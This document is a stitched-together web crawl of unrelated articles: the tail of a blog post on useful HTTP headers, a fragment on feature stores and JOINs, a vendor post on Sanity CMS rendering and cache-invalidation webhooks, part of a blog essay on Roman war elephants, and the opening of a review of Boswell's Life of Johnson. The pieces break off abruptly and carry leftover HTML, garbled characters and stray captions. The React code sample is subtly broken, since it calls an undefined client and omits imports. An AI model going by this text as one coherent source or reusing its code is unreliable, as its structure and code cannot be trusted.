    <span>"accept-language"</span><span>:</span> <span>"en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7"</span><span>,</span>
    <span>"cache-control"</span><span>:</span> <span>"max-age=0"</span><span>,</span>
    <span>"sec-fetch-mode"</span><span>:</span> <span>"navigate"</span><span>,</span>
    <span>"sec-fetch-site"</span><span>:</span> <span>"same-origin"</span><span>,</span>
    <span>"sec-fetch-user"</span><span>:</span> <span>"?1"</span><span>,</span>
    <span>"upgrade-insecure-requests"</span><span>:</span> <span>"1"</span><span>,</span>
  <span>}</span><span>,</span>
  referrerPolicy<span>:</span> <span>"no-referrer-when-downgrade"</span><span>,</span>
  body<span>:</span> <span>null</span><span>,</span>
  method<span>:</span> <span>"GET"</span><span>,</span>
  mode<span>:</span> <span>"cors"</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>So you can see the URL or location of the resource, some information about the request and also a lot of headers with some information about the request.
This is how your browser tells the server some more information about the request. For example what kind of data type it accepts or
how the client is handling the cache.</p>
<p>After sending the request, the server replies, and it also sets some headers in the reply, which could look like this: </p>
<div data-language="text"><pre><code>:authority: www.lorenzweiss.de
:method: GET
:path: /race_conditions_explained/
:scheme: https
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
accept-encoding: gzip, deflate, br
accept-language: en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7
cache-control: max-age=0
cookie: _ga=GA1.2.1173972759.1584812492; _gid=GA1.2.2076192721.1594044231
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36</code></pre></div>
<p>There is also some information that the server wants to tell the browser what to do with the resource, for example
if there are cookies, it must be determined which encoding was used, etc</p>
<p>Basically, in the http-context the headers for the communication of the browser and the server are used to extend the simple
Requests for resources. You could see it as the sheet of paper that is added on top of a package that you oder from an online store,
giving you more information about the context and the resource that you ordered.
Most of the headers have quite good defaults which you don't need to think of, but there are some headers that
can get quite important, like CORS headers. But there are so much more headers that you might never heard of which are very useful
and good to know how to use. </p>

<p>Do not worry, this article will not deal with CORS headers. The following http headers are those that are rarely used, but
can be really powerful and helpful to significantly improve the communication between a server and the browser. </p>
<p>So let's dig into it. Here are some headers that you can set and that are very useful and practical.</p>
<h2 id="if-range"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/If-Range">If-Range</a><a href="#if-range" aria-label="if range permalink"></a></h2>
<h3>What and why?</h3>
<p>Imagine you start downloading a large resource, such as a video, an image, etc., and stop in between because of connection problems.
With <code>If-Range</code> you can tell the server if the representation is unchanged, to send the part(s) that are requested in Range.
Which means only the parts that were missing and not again the whole thing.</p>
<p>This can be very helpful when dealing with large resources and often bad connections as with mobile devices.
Because the resource can be downloaded in parts even if the connection is interrupted in between. </p>
<h4>How to use</h4>
<p>It can either be used with a date when the resources were last modified, or with an <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETag</a>, which is a key to help if the resources was invalidated</p>
<div data-language="text"><pre><code>If-Range: &lt;day-name&gt;, &lt;day&gt; &lt;month&gt; &lt;year&gt; &lt;hour&gt;:&lt;minute&gt;:&lt;second&gt; GMT
If-Range: &lt;etag&gt;</code></pre></div>
<h4>Example</h4>
<div data-language="text"><pre><code>If-Range: Wed, 21 Oct 2015 07:28:00 GMT </code></pre></div>
<h2 id="vary"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Vary">Vary</a><a href="#vary" aria-label="vary permalink"></a></h2>
<p><code>Vary</code> Comes from a time when the web or http was used for a variety of things and not just for web pages.<br>
It is based on the idea of using http to exchange information in many different formats.
How does it do that? Well, it tells the server in which header to find the information, how to present the information. </p>
<p>Nowadays it can be really helpful if you have different resources for different customers, for example
mobile, tablet or desktop.
Imagine three different images for the same resource are stored on the server, depending on the device.
Then you can simply use the <code>Vary</code> header to tell the server to check the device and then decide which image size to send. </p>
<h4>Example</h4>
<p>For the example with the device dependent images, you can simply pass the 'user agent' to tell the server
that it should check the user-agent for device information. </p>

<h4>How to use</h4>

<p>Just enter the header, the server must check before deciding which resource to send.</p>
<h2 id="content-disposition"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Content-Disposition">Content-Disposition</a><a href="#content-disposition" aria-label="content disposition permalink"></a></h2>
<p>If we go back to the example of a request to a server, for example to load this website, it is clear to the browser,
that it must <strong>display</strong> the resource of the answer.
But it can also be the case that the server sends a resource that the browser should automatically download to the user's computer,
like a picture or pdf etc.
A server can tell the browser what the browser should do with the attached resource via the <code>Content Disposition</code> header.</p>
<h4>Example</h4>
<p>With defining the <code>Content-disposition</code> to <code>attachment</code> the browser knows that this is a resource to download instead of just
show. </p>
<div data-language="text"><pre><code>Content-Disposition: attachment; filename="data.pdf"</code></pre></div>
<h4>How to use</h4>
<p>You can define the header as <code>inline</code> or <code>attachment</code>, where `inline is always the default.  </p>
<div data-language="text"><pre><code>Content-Disposition: &lt;inline | attachment&gt;</code></pre></div>
<h2 id="feature-policy"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy">Feature-Policy</a><a href="#feature-policy" aria-label="feature policy permalink"></a></h2>
<p>This is a fairly new header and therefore only supported by modern browsers (sorry to all IE users). However
I want to mention this anyway because I think it can be really helpful for some use cases.<br>
Basically, the <code>feature-policy tells the browser which features or apis the browser should provide to the document and its</code>iframes` to be used. </p>
<p>For example, it can ban all scripts or iframes etc. within this website to allow sensitive apis like the camera or microphone.</p>
<h4>How to use</h4>
<div data-language="text"><pre><code>Feature-Policy: &lt;directive&gt; &lt;allowlist&gt;</code></pre></div>
<p>The <code>directive</code> is the name of the feature. You can see the full <a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy#Directives">list of features here</a>
The <code>allowlist</code> defines the origins which are allowed to use the directive.</p>
<h3>Example</h3>
<p>Suppose we want our website to use neither the microphone nor the camera. With this header the
document or a contained iframe cannot access these functions.</p>
<div data-language="text"><pre><code>Feature-Policy: microphone 'none'; camera 'none'</code></pre></div>
<h3>More Headers:</h3>
<p>Here are some more headers that are worth mentioning: </p>
<ul>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Upgrade-Insecure-Requests">Upgrade-Insecure-Requests</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Age">Age</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Trailer">Trailer</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Location">Location</a></li>
</ul>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="conclusion permalink"></a></h2>
<p>Https headers are great and also very useful! But sometimes they can be quite complex, and it's really hard to get an overview of what headers are available and what benefits they bring.
Also when developing a website, especially in the frontend, you don't come in contact with them too often, except maybe with the CORS headers.
But I think that this missed some possibilities. http headers represent the communication between the server and the
customers much better, and we all know that communication is the key to a good relationship.</p>
<p>I hope I could shed some light on the darkness of http headers for you. In case I missed a good and helpful header,
please do not hesitate to send me a mail or contact me in any way.</p></div></div>]]>

In fact, KV stores are missing a key mechanism needed to make features reusable: JOINs. JOINs enable features to be reused by different models. This blog is about how to scale your ML infrastructure by reusing cached features so that the number of feature pipelines you manage does not grow linearly with the number of models you run in production.</p><figure id="w-node-6837f843508c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92f4e94a9b1084ab992187_twitter.jpg" loading="lazy" alt=""></p><figcaption><a href="https://odsc.com/speakers/from-silos-to-platform-building-twitters-feature-marketplace/">Img from OSDC talk by Twitter</a>. Twitter evaluate their Feature Store by the number of features that are reused across teams.</figcaption></figure><h2>The Cost of No JOINs: One Feature Pipeline per Model</h2><p>If you don’t reuse features across different models, you will need a new feature pipeline for every new model you put in production. In the diagram below, there is a 1:1 mapping between train/test datasets and models. For every new model you put in production, you will write a new feature pipeline from your data stores that transforms and validates the raw data and performs aggregations, materializing train/test data to files. A ML training program (or pipeline) then trains and validates a model with the train/test data, after which it is tested and deployed to production.</p><p>It is very difficult to reuse the features in the materialized train/test datasets, as they tend to be stored in a format specific to a ML framework: .tfrecord for TensorFlow,.npy for PyTorch - and they cannot be easily combined with features stored in other train/test datasets. This is often due to the limitations of the file formats: neither TFRecord nor NPY support projections (selecting just a subset of columns).</p><p>If you intend to run hundreds of models in production, running hundreds of pipelines will explode your technical debt.</p><figure id="w-node-5b746662ee67-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92ea783652dae4e198dca1_pic-01re.jpg" loading="lazy" alt=""></p></figure><p>In online feature stores that do not support JOINs, it is typically the responsibility of the application to perform the JOIN of the cached features to create the feature vector. So, if you build your own online feature store using Cassandra or DynamoDB, you will need to also add logic for joining (and ordering) features in your applications/models.&nbsp;</p><p>Every new feature you add to that model will need an update to the feature pipeline and changes to the application logic - making it costly and potentially cross-team work.</p><figure id="w-node-0abcd444357c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eaa4cc8f44bbcc4cb4ad_pic-02re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs enable Feature Reuse</h2><figure id="w-node-792e5aca9095-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eac165896f1612cb3dea_pic-03re.jpg" loading="lazy" alt=""></p></figure><p>A JOIN is a Structured Query Language (SQL) command to combine data from two different two database tables. JOINs are used to create a view over the data that originates from one or more tables. If we assume that we store features normalized in database tables, then we are able to create sets of features (training datasets) by selecting different features from different tables and joining them together using a common join key. The join key(s) identify the common entity these feature values represent.&nbsp;</p><p>If we now assume that features are stored as columns in tables, then what is a train/test dataset? It is a set of features along with a target column. Assuming the features are already present in existing tables, we can just join those features (columns) together to create a view - this view is the train/test dataset. The order of features (in a view) that makes up a train/test dataset is significant - a train/test dataset is a <a href="https://www.mathsisfun.com/combinatorics/combinations-permutations.html">permutations of features - not a combination</a>.

October 23, 2020 | https://www.spirit.fish/blog/working-with-sanity | <a href="https://web.archive.org/web/*/https://www.spirit.fish/blog/working-with-sanity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

  <div>
    <p>Iâ€™ve said it a few times, but 
      <a target="_blank" href="https://www.sanity.io/">Sanity CMS</a>
 is easily the most futuristic content management system on the planet - with slick editor experience, unique deployable infrastructure, and the introduction of itâ€™s new 
      <a target="_blank" href="https://www.sanity.io/blog/introducing-presence">Presence</a>
 functionality, personally weâ€™d never use anything else!</p>

<p>So, itâ€™s only natural Spirit Fish would integrate nicely. Hereâ€™s a few of the ways we work with Sanity:</p>

<h2><strong>1. Rendering Sanity content for great SEO, Google Lighthouse Scores, and low FMP</strong></h2>

<p>Sanity is a headless CMS, so that means that in order to display data to end users, content needs to be loaded over HTTP. While thereâ€™s a bunch of framework dependent approaches to this, we prefer to load the data in the same javascript bundle that powers our React.js projects. </p>

<p>Hereâ€™s a trivial example using 
      <a target="_blank" href="https://reactjs.org/docs/create-a-new-react-app.html">create-react-app</a>
:</p>

<pre><code>
import React from "react";
import SanityClient from "@sanity/client";

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const query = `*[_type == "movie"] {
  _id,
  title
}[0...50]`;

function App() {
  const [movies, setMovies] = useState(null);

  useEffect(async () =&gt; {
    setMovies(await sanity.fetch(query));
  }, []);

  return (
    &lt;ul&gt;
      {movies.map(movie =&gt; (
        &lt;li key={movie._id}&gt;
          {movie.title}
        &lt;/li&gt;
      ))}
    &lt;/ul&gt;
  );
};

export default App;

</code></pre>

<p>If you deploy a create-react-app to a host like an S3 bucket, etc - when you view-source, youâ€™ll notice that your movies arenâ€™t there. Thatâ€™s because that content is loaded at the runtime! When Googleâ€™s crawler indexes your site, it will only see a blank page, and all of your end users wonâ€™t see any content until theyâ€™ve downloaded your javascript, and THEN loaded the Sanity query. Thatâ€™s no good for SEO, or conversions.</p>

<p>Of course, this is our bread and butter: create a Spirit Fish renderer, point it at that S3 bucket, and point your DNS at our CDN. Refresh your site, and boom! Your site is now rendered on the fly.</p>

<p>We find that adding a Spirit Fish renderer to a site usually doubles your 
      <a target="_blank" href="https://developers.google.com/web/tools/lighthouse">Google Lighthouse</a>
 scores, so thatâ€™s a big win for 5 minutes of setup!</p>

<h2><strong>2. Purging the entire Spirit Fish cache when content changes in Sanity</strong></h2>

<p>On first request - our renders take a few seconds - so we cache the result in a global CDN so that your rendered site is close to your users. </p>

<p>Got it! But what if my content changes?</p>

<p>Well - youâ€™ll need to trigger an invalidation in Spirit Fish. The easiest way to do this for small sites is to trigger a full invalidation. This will force your site to be re-rendered the next time your users visit, meaning your new data will be pulled from Sanity!</p>


<p>Thatâ€™s what we built our invalidations API for. Hereâ€™s what your `invalidate_all` endpoint looks like:</p>

<pre>  <code>
https://www.spirit.fish/api/v1/renderers/$RENDERER_ID/invalidate_all?api_key=$RENDERER_API_TOKEN
  </code>
</pre>

<p>This endpoint takes a `POST` request, so you can easily add it directly to Sanityâ€™s management portal, no code required:</p>

<a href="https://www.sanity.io/docs/webhooks" target="_blank">
  <p><img src="https://www.spirit.fish/assets/blog_posts/sanity_logo_square-7b9b2a49f4583770b16f9e4898285e61afa005dd41fa9e93e2e89b8d5b446cb1.jpg">

      <p>https://www.sanity.io/docs/webhooks</p>
    </div>
  </div>
</a>

<p>Now, whenever an editor updates content in Sanity, it will clear your Spirit Fish cache, easy as that!</p>

<h2><strong>3. Purging specific Spirit Fish pages when Sanity content changes with a serverless function</strong></h2>

<p>For small projects with a handful of pages, the above is probably fine - but when you have a large project (say an editorial with hundreds of pages), you wouldnâ€™t want to purge the entire Spirit Fish if only one page has changed.</p>

<p>In cases like this, youâ€™ll need your own backend endpoint to manage cache invalidations. We like serverless functions for this:</p>

<pre><code>
import SanityClient from '@sanity/client';
import handleError from 'utils/services/handleError';
import notEmpty from 'utils/notEmpty';

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const buildCacheClearPathForRecord = (record) =&gt; {
  switch (record._type) {
    case 'movie':
      return `/movies/${record.slug}`;
    case 'director':
      return `/directors/${record.slug}`;
  }
};

export default async (request, response) =&gt; {
  try {
    const records =
      await SanityClient.getDocuments(request.body.ids.all);
    const pages =
      records.filter(notEmpty).map(buildCacheClearPathForRecord);

    await fetch(`https://www.spirit.fish/api/v1/renderers/${process.env.RENDERER_ID}/api_invalidations`, {
      method: 'post',
      body: JSON.stringify({
        invalidation: { pages }
      }),
      headers: {
        'X-Hatchery-Renderer-Api-Key': process.env.RENDERER_API_KEY,
        'Content-Type': 'application/json'
      }
    });
    return response.end();
  } catch (e) {
    return handleError(request, response, e);
  }
};

</code></pre>

<p>Deploy your serverless function (we like 
      <a target="_blank" href="https://firebase.google.com/">Firebase</a>
 or 
      <a target="_blank" href="https://vercel.com/">Vercel</a>
), and setup your Sanity webhook (like we did above - don't forget the enviornment variables!) to hit this endpoint instead. Bingo! Youâ€™re now invalidating individual pages as content changes; eliminating the need for site wide rerenders, and keeping your content in cache for as long as possible.</p>



    <p>Spirit Fish is free to try, and each renderer comes with a generous free tier that should cover most hobby projects.

<p>Today, in Part II of our three part series on War Elephants, we’re going to look at the drawbacks of war elephants.  Last time (<a href="https://acoup.blog/2019/07/26/collections-war-elephants-part-i-battle-pachyderms/">here</a>), we discussed the factors that made war elephants so powerful on the battlefield.  To recap: war elephants had a strong psychological element (they are very scary) and could drastically disrupt both infantry and cavalry alike, leaving them easy pickings for forces supporting the war elephant.  Those uses made war elephants popular not only in India, where they were first developed, but among Alexander the Great’s successors, and even as far west as Carthage.  <a href="https://acoup.blog/2019/08/09/collections-war-elephants-part-iii-elephant-memories/">And next time, we’ll look at why elephants <em>remained</em> popular in India</a>, despite the drawbacks we’ll discuss today.</p>



<p>The best way to think about the weaknesses of war elephants is to look at the question with a specific context, so we are going to narrow in on one of the two key areas where war elephants did not last as a weapon system: the Roman world (both the period of the Republic and the Empire).  As I mentioned in the last post, by the Imperial period, the Romans seem to have decided that elephants were not worth the trouble and discontinued their use.  Roman military writers routinely disparage elephants (we’ll see why) as weapons of war and despite the fact that Rome absorbed not one but <em>three</em> states which actively used elephants in war (Carthage, the Ptolemaic and Seleucid Kingdoms) – and thus we may assume three sets of capture, training and breeding programs for maintaining the animals – they did not continue their use.  It is one thing not to adopt a foreign weapon, it is quite another to inherit the entire production complex and still say, “no, not for me.”</p>

I missed this last time, but I just want to note <strong>everything</strong> is wrong with this.  Let me count the ways:<br>1) These elephants are <strong>way</strong> too big.<br>2) The towers on their backs won’t be invented for more than a century<br>3) The bit-and-bridle system of control is not how elephants are controlled.<br>4) The weapons for the tusks are also wrong.<br>5) <strong>Xerxes didn’t have any elephants in his army</strong> (not even in the fantasy count that Herodotus gives)<br>6) This is not how you fight elephants and will get everyone stepped on.<br>One of these days, we’re going to talk about this movie and Sparta.  Until then: <strong>Sparta is terrible.</strong></figcaption></figure>



<p>So today we’re going to ask, “why?”  We’ve answered that question in the immediate term – to quote Trautmann (2015) on the point, “the Roman refusal of the war elephant..was based upon a low estimate of its value” (250).  To put another way, they thought they sucked.  We know elephants <em>could</em> be quite potent in battle, so the answer must be a touch more complicated.  We’ll look at this two ways: first (because it’s me) in terms of <em><strong>logistics</strong></em>, and then in terms of anti-elephant <em><strong>tactics</strong></em>, to see why elephants could not succeed against (or with) Rome.  I am also going to speculate – just a touch – on which of these factors might explain the other major area elephant warfare did not penetrate: China.</p>



<h2>Roman Elephants</h2>



<p>But first, a necessary caveat to an objection no doubt already brewing in the minds of some: but didn’t the Romans use elephants sometimes?  Yes, though Roman employment of elephants was at best uneven (this is a point, I’d like to note, where Trautmann (2015) shows its value over, for instance, J. M. Kistler’s <em>War Elephants </em>(2006) – the latter’s reading of Roman use of war elephants bends the evidence to serve an argument, rather than the other way around).  Nevertheless, the Romans did use war elephants during the last two centuries of the Republic.</p>



<p>The Romans had some war elephants (just 20) at Cynocephelae (197 B.C.) against Macedon – these had been drawn from the kingdom of Numidia, which had sided with Rome against Carthage in the Second Punic War.  Plutarch (<em>Flam</em>. 8.2-5) leaves the animals out of the battle narrative, but Livy (who is the better source; Liv. 33.9) notes their use to break up the Macedonian right wing, which was not yet even in fighting formation.  It’s not clear the elephants were necessary for the Roman victory here and the key action was actually a flanking attack by infantry.</p>



<p>The Romans brought elephants to Magnesia (190 B.C.), but left them in reserve; the Romans only had a few, whereas their Seleucid opponents had brought many more.  Moreover, the Roman elephants were smaller African elephants, effectively useless against the large Asian elephants the Seleucids used.  Pydna (168 B.C.) against the Macedonians again, is harder to assess because the sources for it are poor (part of Livy’s narrative of the battle is lost).  Plutarch (<em>Aem.</em> 19-22) leaves the elephants out again, whereas Livy stops to expressly say they were useless.  Kistler (himself reliant on other scholars to read the Latin for him) reads this as the elephants being the decisive element; the sources cannot support this reading.  Livy – who appears to be quoting Polybius, a contemporary of the battle – is quite clear what he thinks of the elephants, “For as new inventions often have great force in the words of men, but when tried, when they need to work, and not just have their working described, they evaporate without any effect – just so the war elephants were just a name without any real use.” (<a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0211%3Abook%3D44%3Achapter%3D41">Liv 44.41.4</a>, my rough translation).</p>

<p>The Romans did find elephants useful in places like Spain or southern Gaul (modern Provence) where just a handful could bewilder and terrify opponents completely unused to and unprepared for them.  The last gasp of true Roman war elephants came in 46 B.C., where Julius Caesar defeated a Roman army led by Metellus Scipio which had sixty elephants in it.  The elephants lost and one of Caesar’s legions (my personal favorite, Legio V Alaudae (Larks!)) took the elephant as a legionary symbol in commemoration of having beaten them.</p>



<p>So absolutely yes, the Romans of the Middle and Late Republic made some use of war elephants, but it was hardly a distinguished run.  As Trautmann notes – quite correctly, in my view – the Romans were always more interested in ways to defeat elephants than to use them.  Which brings us back to our question: elephants are <strong>awesome</strong>, Romans are <em>also awesome</em>…so why didn’t the Romans like elephants?</p>



<h2>Elephant Logistics</h2>



<p>From trunk to tail, elephants are a logistics <em>nightmare</em>.</p>



<p>And that begins almost literally at birth.  For areas where elephants are native, nature (combined, typically, with the local human terrain) create a local ‘supply.’  In India this meant the elephant forests of North/North-Eastern India; the range of the North African elephant (<em>Loxodonta africana pharaohensis</em>, the most likely source of Ptolemaic and Carthaginian war elephants) is not known.  Thus for many elephant-wielding powers, trade was going to always be a key source for the animals – either trade with far away kingdoms (the Seleucids traded with the Mauyran Indian kingdom for their superior Asian elephants) or with thinly ruled peripheral peoples who lived in the forests the elephants were native to.</p>



<p>(We’re about to get into some of the specifics of elephant biology.  If you are curious on this topic, I am relying heavily on R. Sukumar, <em>The Asian Elephant: Ecology and Management</em> (1989).  I’ve found that information on Asian elephants (<em>Elephas maximus</em>) <strong>much</strong> easier to come by than information on African elephants (<em>Loxodonta africana</em> and <em>Loxodonta cyclotis</em>).)</p>



<p>In that light, creating a breeding program – as was done with horses – seems like a great idea.  Except there is one major problem: a horse requires about four years to reach maturity, a mare gestates a foal in eleven months and can go into heat almost immediately thereafter.  By contrast, elephants reach adulthood after seventeen years, take 18-22 months to gestate and female elephants do not typically mate until their calf is weaned, four to five years after its birth.  A ruler looking to build a stable of cavalry horses thus may start small and grow rapidly; a ruler looking to build a corps of war elephants is looking at a very slow process.  This is compounded by the fact that elephants are notoriously difficult to breed in captivity.  There is some speculation that the Seleucids nonetheless attempted this at Apamea, where they based their elephants – in any event, they seem to have remained dependent on imported Indian elephants to maintain the elephant corps.  If a self-sustaining elephant breeding program for war elephants was ever created, we do not know about it.</p>



<p>To make matters <em>worse</em>, elephants require <strong>massive</strong> amounts of food and water.  In video-games, this is often represented through a high elephant ‘upkeep’ cost – but this often falls well short of the reality of keeping these animals for war.  Let’s take <em>Total War: Rome II</em> as an example: a unit of Roman (auxiliary) African elephants (12 animals), costs 180 upkeep, compared to 90 to 110 upkeep for 80 horses of auxiliary cavalry (there are quite a few types) – so one elephant (with a <em>mahout</em>) costs 15 upkeep against around 1.25 for a horse and rider (a 12:1 ratio).  Paradox’s <em>Imperator</em> does something similar, with a single unit of war elephants requiring 1.08 upkeep, compared to just 0.32 for light cavalry; along with this, elephants have a heavy ‘supply weight’ – twice that of an equivalent number of cavalry (so something like a 2:1 or 3:1 ratio of cost).</p>

They do this <strong>a lot</strong>.</figcaption></figure>



<p>Believe it or not, this <em>understates</em> just how hungry – and expensive – elephants are.  The standard barley ration for a Roman horse was 7kg of barley per day (7 Attic medimnoi per month; Plb. 6.39.12); this would be supplemented by grazing.  Estimates for the food requirements of elephants vary widely (in part, it is hard to measure the dietary needs of grazing animals), but elephants require in excess of 1.5% of their body-weight in food <em>per day</em>.  …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn2189487741" rel="footnote"><sup id="fnref2189487741">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn2189487742" rel="footnote"><sup id="fnref2189487742">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn2189487743" rel="footnote"><sup id="fnref2189487743">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn2189487744" rel="footnote"><sup id="fnref2189487744">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn2189487745" rel="footnote"><sup id="fnref2189487745">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or 